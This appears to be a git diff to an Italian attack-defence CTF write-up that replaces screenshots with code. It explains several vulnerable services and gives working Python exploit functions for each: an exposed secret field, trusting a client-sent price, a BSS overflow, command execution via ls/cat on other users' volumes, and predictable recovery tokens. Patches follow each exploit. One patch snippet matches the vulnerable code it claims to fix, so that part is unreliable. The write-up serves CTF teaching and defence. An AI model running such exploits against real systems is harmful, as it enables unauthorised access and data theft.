@@ -17,20 +17,61 @@ FIXME è una challenge web. Essa mette a disposizione solo un backend col quale 
 
 La prima vulnerabilità è molto semplice. L'applicazione forniva un endpoint "/api/products" che forniva informazioni relative ai prodotti. Tuttavia, veniva anche esposto un dato sensibile "secret", in cui era presente la flag (da notare che la challenge stessa dava un hint dicendo che bisognava mostrare solo nome e prezzo dei prodotti).
 
-![alt text](imgs/fixme-vuln1.png)
+```javascript
+// Display name and prices of products
+app.get(
+  '/',
+  asyncWrapper(async (req, res) => {
+    const offset = req.query.offset ? parseInt(req.query.offset, 10) : 0;
+    const { rows } = await db.query(
+      'SELECT * FROM "products" ORDER BY id DESC OFFSET $1 LIMIT 10',
+      [offset]
+    );
+
+    res.json(rows);
+  })
+);
+```
 
 #### Exploit
 
 L'exploit, di conseguenza, è stato anche molto semplice. Bastava fare una richiesta all'endpoint citato da cui si riceveva una lista di oggetti json. A quel punto la flag si trovava nel secret dei prodotti i cui id erano indicati cme flagIds dal gameserver.
 
-![alt text](imgs/fixme-exp1.png)
+```python
+def get_flag(ip, hint):
+	session = requests.Session()
+
+	resp = session.get(f"http://{ip}:8080/api/products", timeout=10).json()
+	flag = ""
+	for x in resp:
+		if str(x['id']) == hint:
+			flag = x['secret']
+
+
+	# PRELEVA FLAG E RESTITUISCILA
+	return flag
+```
 
 
 #### Patch
 
 Anche la patch non ha richiesto molti sforzi. È bastato modificare la query che prelevava i prodotti che venivano mostrati andando a prelevare tutti i campi tranne il secret.
 
-![alt text](imgs/fixme-patch1.png)
+```javascript
+// Display name and prices of products
+app.get(
+  '/',
+  asyncWrapper(async (req, res) => {
+    const offset = req.query.offset ? parseInt(req.query.offset, 10) : 0;
+    const { rows } = await db.query(
+      'SELECT id, name, price FROM "products" ORDER BY id DESC OFFSET $1 LIMIT 10',
+      [offset]
+    );
+
+    res.json(rows);
+  })
+);
+```
 
 
 
@@ -38,19 +79,73 @@ Anche la patch non ha richiesto molti sforzi. È bastato modificare la query che
 
 Un'altra vulnerabilità di questo servizio permetteva di vedere un prodotto anche se non si avevano abbastanza monete per poterlo fare. Ciò era possibile, in quanto nella richiesta POST da fare all'endpoint "/api/products/view" si poteva inserire anche il prezzo del prodotto e le monete dell'utente venivano confrontate con questo prezzo.
 
-![alt text](imgs/fixme-vuln2.png)
+```javascript
+// User: view a product if the user have enough fidelity coins
+app.post(
+  '/view',
+  asyncWrapper(async (req, res) => {
+    if (req.session.userId === undefined) {
+      throw new HttpError(401, 'Unauthorized');
+    }
+
+    const { productId, price } = req.body;
+    const {
+      rows: [product]
+    } = await db.query('SELECT * FROM "products" WHERE id = $1', [productId]);
+
+    if (!product) {
+      throw new HttpError(404, 'Product not found');
+    }
+
+    const {
+      rows: [user]
+    } = await db.query('SELECT * FROM "users" WHERE id = $1', [req.session.userId]);
+
+    if (user.coins < product.price) {
+      throw new HttpError(400, 'You need more fidelity coins to view this product');
+    }
+
+    res.json({
+      secret: product.secret
+    });
+  })
+);
+
+```
 
 #### Exploit
 
-L'exploit dunque prevedeva di registrare un utente e visitare questo endpoint, inserendo come prezzo, ad esempio, 1, in quanto un utente appena registrato aveva a disposizione 10 monete.
+L'exploit dunque prevedeva di registrare un utente e visitare questo endpoint, inserendo come prezzo, ad esempio, 1, in quanto un utente appena registrato aveva a disposizione 10 monete (da notare che si fa il riscatto della gift card che viene data in seguito alla registrazione per generare "rumore").
 
-![alt text](imgs/fixme-exp2.png)
+```python
+def get_flag(ip, hint):
+	session = requests.Session()
+
+	username = generate_random_string(6)
+	password = "password"
+	data = {"username": username, "password": password}
+
+	giftCard = session.post(f"http://{ip}:8080/api/users/register", json=data, timeout=3).json()
+
+	response = session.post(f"http://{ip}:8080/api/giftCards/redeem", json=giftCard, timeout=3)
+	
+	data = {"productId": hint, "price": 1}
+	response = session.post(f"http://{ip}:8080/api/products/view", json=data, timeout=3).json()
+
+	# PRELEVA FLAG E RESTITUISCILA
+	flag = response["secret"]
+	return flag
+```
 
 #### Patch
 
 La patch prevedeva semplicemente di utilizzare il prezzo del prodotto recuperato tramite la query, anziché il prezzo inserito dall'utente.
 
-![alt text](imgs/fixme-patch2.png)
+```javascript
+if (user.coins < product.price) {
+    throw new HttpError(400, 'You need more fidelity coins to view this product');
+}
+```
 
 
 
@@ -78,11 +173,33 @@ Dato che il **g_admin_token** è in realtà lungo 17 char, si fa un BSS overflow
 
 Il codice dell'exploit è così semplice da comprendere, oltre a tutte le operazioni da fare per navigare all'interno del menù, la riga seguente esegue il BSS overflow dato che passa 20 caratteri invece che 17:
 
-![Gatto carino](imgs/BSS.png)
+```python
+p.sendline(b"xxxxxxxxxxxxxxxxxxxx")
+```
 
 Il codice completo:
 
-![Gatto carino](imgs/e.png)
+
+```python
+def get_flag(ip, hint):
+    p=remote(ip,1337)
+    p.recvuntil(b"> ", timeout=0.1)
+    p.sendline(b"1")
+    p.recvuntil(b": ", timeout=0.1)
+    p.sendline(hint.encode())
+    p.recvuntil(b": ", timeout=0.1)
+    p.sendline(b"xxxxxxxxxxxxxxxxxxxx")
+    p.recvuntil(b"> ", timeout=0.1)
+    p.sendline(b"3")
+    p.recvuntil(b": ", timeout=0.1)
+    p.sendline(b"0")
+    p.recvuntil(b"> ", timeout=0.1)
+    p.sendline(b"2")
+    p.recvuntil(b": ", timeout=0.1)
+    p.recvuntil(b": ", timeout=0.1)
+    stringa=p.recvuntil(b"=", timeout=0.1)
+    return stringa.decode()
+```
 
 
 ### Patch
@@ -108,15 +225,40 @@ Come già detto, l'obiettivo era individuare quale tra i file presenti nei volum
 
 Inizialmente si registrava un utente:
 
-![alt text](imgs/capp-exp1.png)
+```python
+def get_flag(ip, hint):
+	userid = json.loads(hint)["user_id"]
+	session = requests.Session()
+
+	username = generate_random_string(10)
+	password = "password"
+
+	data = f"username={username}&password={password}"
+	register = session.post(f"http://{ip}/register" , data = data, headers = {"Content-Type": "application/x-www-form-urlencoded"}, timeout=1)
+```
 
 Successivamente si listavano i file presenti nel volume dell'utente considerato (flagId):
 
-![alt text](imgs/capp-exp2.png)
+```python
+	cmd = {"command": f"ls .union./volume-{userid}/"}
+	cmd1 = session.post(f"http://{ip}/command", json=cmd, timeout=1).json()
+	files = cmd1["output"].split(" ")
+```
 
 Infine, si scorrevano tutti questi file finché non si trovava la flag all'interno di uno di questi:
 
-![alt text](imgs/capp-exp3.png)
+```python
+	for f in files:
+		cmd = {"command": f"cat .union./volume-{userid}/{f}"}
+		cmd2 = session.post(f"http://{ip}/command", json=cmd, timeout=3).json()
+		res = cmd2["output"]
+		flag1 = re.findall("[A-Z0-9]{31}=", res)
+		flag = flag1[0]
+		if flag is not None:
+			return flag
+	
+	raise Exception("No flag founded!")
+```
 
 
 #### Patch
@@ -138,7 +280,11 @@ La vulnerabilità individuata in questo servizio è relativa all'uso della funzi
 
 Quando un utente si registra gli viene fornito il recovery token che viene generato a partire dallo username. Per generare questo token vengono generati due numeri primi random a 768 bit.
 
-![alt text](imgs/cc-vuln.png)
+```python
+def get_secret_tokens(username):
+    mask = (1 << 768) - 1
+    p, q = getPrime(768), getPrime(768)
+```
 
 Il problema però risiede nella funzione getPrime con la quale si generano questi numeri. Essa infatti non genera dei numeri primi realmente casuali. Infatti, è stato possibile notare che il token relativo ad uno username variava sempre in 3 (o al max 4) possibili scelte. Questo proprio perché venivano scelti sempre gli stessi numeri primi.
 
@@ -148,27 +294,76 @@ A questo punto quindi, l'idea per l'exploit è stata di calcolare da sè il poss
 
 Inizialmente, si calcolava il recovery token per lo username dato dal flagId.
 
-![alt text](imgs/cc-exp1.png)
+```python
+def get_flag(ip, hint):
+	p = remote(ip, 5000)
+	logged = False
+	password = ""
+	username = json.loads(hint)["username"]
+
+	_, recovery_token = get_secret_tokens(username)
+```
 
 Successivamente si provava a utilizzare questo token per recuperare la password dell'utente.
 
-![alt text](imgs/cc-exp2.png)
+```python
+	p.recv(timeout=1)
+	p.sendline(b"3")
+
+	p.recv(timeout=1)
+	p.sendline(username.encode())
+	p.recv(timeout=1)
+	p.sendline(recovery_token.encode())
+	resp = p.recvline(timeout=1).decode()
+
+	if "password" in resp:
+		logged = True
+		password = resp.split("password: ")[1]
+```
 
 Recuperata questa, si faceva il login.
 
-![alt text](imgs/cc-exp3.png)
+```python
+	p.recv(timeout=1)
+	p.sendline(b"2")
+
+
+	p.recvuntil(b"username: ", timeout=1)
+	p.sendline(username.encode())
+	
+	p.recvuntil(b"password: ", timeout=1)
+	p.sendline(password.strip().encode())
+```
 
 Infine, la flag era una delle password memorizzate da quell'utente.
 
-![alt text](imgs/cc-exp4.png)
+```python
+	p.recv(timeout=1)
+	p.sendline("2".encode())
+	resp = p.recv(timeout=1).decode()
+
+	p.close()
+
+	# PRELEVA FLAG E RESTITUISCILA
+	flag = re.findall("[A-Z0-9]{31}=", resp)[0]
+	return flag
+```
 
 
 #### Patch
 
 La patch attuata consisteva semplicemente nel cifrare il token generato dalla funzione _get\_secret\_token_. Questa idea permetteva di bloccare tutti quegli attacchi che, come noi, andavano a precalcolare il token.
 
-![alt text](imgs/cc-patch.png)
+```python
+sharing_key, recovery_token = crypto.get_secret_tokens(username)
+encrypted_psw = crypto.encrypt_psw(recovery_token, password)
+```
 
-![alt text](imgs/cc-patch2.png)
+```python
+with open(os.path.join(data_path, username, "pw_recovery"), "x") as f:
+    f.write(str(encrypted_psw))
+```
 
-![alt text](imgs/cc-patch3.png)
+```python
+print(f"Here is your password recovery token: {encrypted_psw}.")
+```
